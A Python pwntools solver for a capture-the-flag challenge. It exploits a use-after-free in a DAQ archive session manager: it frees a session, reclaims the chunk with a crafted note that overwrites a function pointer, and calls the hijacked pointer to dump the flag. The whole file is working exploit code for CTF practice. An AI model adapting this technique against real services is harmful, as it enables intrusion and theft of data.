#!/usr/bin/env python3
"""
Solver for Ch.12b (Ghost in the Archive) — pwntools edition.

Use-after-free in the DAQ archive session manager:
  1. `create A`     → allocates session_t (176B) at slot 0
  2. `delete 0`     → frees the session, but sessions[0] dangling
  3. `note 44`      → allocates note_t (same size class), reuses chunk;
                       the note's content[36..43] overlaps the freed
                       session's report_fn pointer
  4. `query 0`      → calls the dangling report_fn — now our target

Resolve `dump_archive_secrets` via the supplied binary's symbol table, or
override with --target-addr.

Usage:
    python3 solve_pwntool.py <host> <port> --binary ./daq-archive
    python3 solve_pwntool.py <host> <port> --target-addr 0x401234
"""

from __future__ import annotations

import argparse
import re
import sys

from pwn import ELF, context, log, p64, remote

FLAG_RE = re.compile(r"(picoCTF\{[^}]+\}|FLAG\{[^}]+\}|flag\{[^}]+\})")


def resolve_target(binary: str) -> int:
    elf = ELF(binary, checksec=False)
    addr = elf.symbols.get("dump_archive_secrets")
    if addr is None:
        raise SystemExit(f"[!] dump_archive_secrets not found in {binary}")
    return addr


def exploit(host: str, port: int, target: int) -> str:
    io = remote(host, port)
    io.recvuntil(b"DAQ> ")

    # 1. allocate a session at slot 0
    io.sendline(b"create TargetSession")
    io.recvuntil(b"DAQ> ")

    # 2. free it — sessions[0] now dangles
    io.sendline(b"delete 0")
    io.recvuntil(b"DAQ> ")

    # 3. reclaim the chunk via a note, overwriting report_fn
    payload = b"A" * 36 + p64(target)
    io.sendline(f"note {len(payload)}".encode())
    io.recvuntil(b"READY:")
    io.send(payload)
    io.recvuntil(b"DAQ> ")

    # 4. trigger the now-hijacked report_fn
    io.sendline(b"query 0")
    out = io.recvall(timeout=3)
    io.close()
    return out.decode("ascii", errors="replace")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--binary", help="path to daq-archive")
    ap.add_argument("--target-addr", type=lambda s: int(s, 0))
    args = ap.parse_args()

    context.log_level = "info"

    if args.target_addr is not None:
        target = args.target_addr
    elif args.binary:
        target = resolve_target(args.binary)
    else:
        ap.error("provide --binary or --target-addr")

    log.info(f"dump_archive_secrets @ 0x{target:016x}")
    out = exploit(args.host, args.port, target)
    m = FLAG_RE.search(out)
    if not m:
        log.failure(f"no flag in response:\n{out[:500]}")
        return 1
    log.success(f"FLAG: {m.group(1)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
